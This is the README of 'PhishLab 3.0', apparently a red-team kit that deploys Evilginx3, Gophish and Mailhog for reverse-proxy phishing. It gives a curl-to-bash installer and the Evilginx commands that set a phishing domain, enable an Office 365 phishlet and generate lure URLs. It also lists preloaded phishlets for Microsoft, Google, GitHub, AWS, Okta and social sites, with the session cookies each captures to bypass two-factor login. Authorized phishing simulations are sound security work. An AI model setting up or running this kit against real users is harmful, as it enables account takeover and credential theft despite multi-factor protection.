# PhishLab 3.0

A ready-to-deploy phishing lab environment using Evilginx3 (v3.3.0), Gophish, and Mailhog for security researchers, red teams, and penetration testers.

**This setup is for authorized testing only. Do not use for unauthorized access.**

---

## What's Included

- **Evilginx3 v3.3.0** - Reverse proxy phishing framework with MiTM and 2FA bypass capabilities
- **Gophish v0.12.1** - Phishing campaign management and email delivery
- **Mailhog** - Local SMTP server with web UI for capturing test emails
- **UFW Firewall** - Configured to allow only essential ports
- **Systemd services** - All three tools run as managed services
- **Pre-loaded phishlets** - 11 ready-to-use phishlets for common targets

---

## Requirements

- Ubuntu 20.04+ x64 VPS
- Root SSH access
- A registered domain with DNS A-records pointing to the VPS IP:
  - `yourdomain.com` (or a subdomain like `login.yourdomain.com`)
- Ports 80 and 443 open to the public internet

---

## Installation

SSH into your server as root and run:

```bash
bash <(curl -sSL https://raw.githubusercontent.com/AuvaLabs/PhishLab-3.0/main/install.sh)
```

You will be prompted for your domain. Alternatively, pass it as an argument:

```bash
bash <(curl -sSL https://raw.githubusercontent.com/AuvaLabs/PhishLab-3.0/main/install.sh) login.yourdomain.com
```

The script is idempotent and can be re-run safely.

For a full deployment runbook (DNS prerequisites, install, verification, rollback), see [docs/DEPLOY.md](docs/DEPLOY.md). Engagement workflow is in [docs/USAGE.md](docs/USAGE.md).

---

## Post-Install Setup

### 1. Configure Evilginx3

Evilginx3 v3.3.0 stores its state in the `-c` directory (default `/opt/evilginx2/state`). To configure interactively the first time, stop the service and run the binary against the same state dir:

```bash
systemctl stop evilginx
sudo HOME=/opt/evilginx2/state /opt/evilginx2/dist/evilginx \
  -c /opt/evilginx2/state -p /opt/evilginx2/phishlets
```

Inside the evilginx prompt, paste the commands from `/root/evilginx_setup_commands.txt` (v3 syntax):

```
config domain yourdomain.com
config ipv4 external <YOUR_IP>
config autocert on
phishlets hostname o365 yourdomain.com
phishlets enable o365
```

Once configured (autocert will request Let's Encrypt certificates over port 80), exit cleanly and restart the service:

```bash
systemctl start evilginx
```

Then create a lure to get the entry URL: `lures create o365` then `lures get-url 0`.

### 2. Access Gophish Admin

Gophish admin is bound to `127.0.0.1` for security. Access it via SSH tunnel:

```bash
ssh -L 8800:127.0.0.1:8800 root@YOUR_SERVER_IP
```

Then open `http://localhost:8800` in your browser.

The initial admin password is printed in the Gophish service log:

```bash
journalctl -u gophish | grep password
```

### 3. Connect Gophish to Mailhog

1. Open the Gophish admin UI
2. Navigate to **Sending Profiles**
3. Create a new profile with SMTP host: `localhost:1025`
4. No authentication required
5. Send a test email - it will appear in the Mailhog UI

### 4. View Captured Emails

Mailhog UI is bound to `127.0.0.1` for security. Access via SSH tunnel:

```bash
ssh -L 8025:127.0.0.1:8025 deploy@YOUR_SERVER_IP
```

Then open `http://localhost:8025`.

---

## Services

| Service   | Command                        | Port(s)          |
|-----------|--------------------------------|------------------|
| Evilginx  | `systemctl status evilginx`    | 80, 443          |
| Gophish   | `systemctl status gophish`     | 8800 (localhost)  |
| Mailhog   | `systemctl status mailhog`     | 8025 (UI), 1025 (SMTP, localhost) |

Manage services with:

```bash
systemctl start|stop|restart|status <service>
journalctl -u <service> -f    # follow logs
```

---

## Firewall Rules

| Port | Exposure | Service                         |
|------|----------|---------------------------------|
| 22   | public   | SSH                             |
| 80   | public   | HTTP (Evilginx, autocert)       |
| 443  | public   | HTTPS (Evilginx phishing proxy) |
| 8800 | loopback | Gophish admin (SSH tunnel)      |
| 8081 | loopback | Gophish phish (tracking pixel)  |
| 8025 | loopback | Mailhog UI (SSH tunnel)         |
| 1025 | loopback | Mailhog SMTP                    |
| 8443 | loopback | Evilginx-Lab dashboard          |

Only `22/80/443` are opened in UFW; everything else is reached via SSH tunnel.

---

## Included Phishlets

The `phishlets/` directory contains 11 pre-configured phishlets ready for use with Evilginx3 v3.3.0.

### Native Evilginx3 (min_ver 3.0.0+)

| Phishlet | Target | Key Tokens |
|----------|--------|------------|
| `microsoft-live.yaml` | login.live.com | SDIDC, JSHP |
| `microsoft-o365-adfs.yaml` | login.microsoftonline.com + ADFS | ESTSAUTH, ESTSAUTHPERSISTENT |
| `okta.yaml` | Okta tenants (template) | idx |
| `twitter.yaml` | twitter.com / X | kdt, auth_token, ct0, twid |
| `linkedin.yaml` | linkedin.com (with evilpuppet) | li_at |

### Evilginx2-Compatible (work in v3 via backward compat)

| Phishlet | Target | Key Tokens |
|----------|--------|------------|
| `o365.yaml` | login.microsoftonline.com | ESTSAUTH, ESTSAUTHPERSISTENT |
| `google.yaml` | accounts.google.com | SID, HSID, SSID, GAPS |
| `github.yaml` | github.com | user_session, _gh_sess |
| `facebook.yaml` | facebook.com | c_user, xs, sb |
| `instagram.yaml` | instagram.com | sessionid |
| `aws.yaml` | signin.aws.amazon.com | aws-creds, JSESSIONID |

### Notes

- **Okta** requires replacing `<okta-tenant-placeholder>` with your target's tenant name
- **O365 ADFS** requires replacing `example.com` with the actual ADFS domain

---

## Security Notes

- Gophish admin is bound to `127.0.0.1` - always access via SSH tunnel
- Mailhog SMTP is bound to localhost - only accessible from the server itself
- Services run under a dedicated `phishlab` user, not root
- Change the default Gophish password immediately after first login
- This lab is intended for **authorized security testing only**

---

## License

MIT
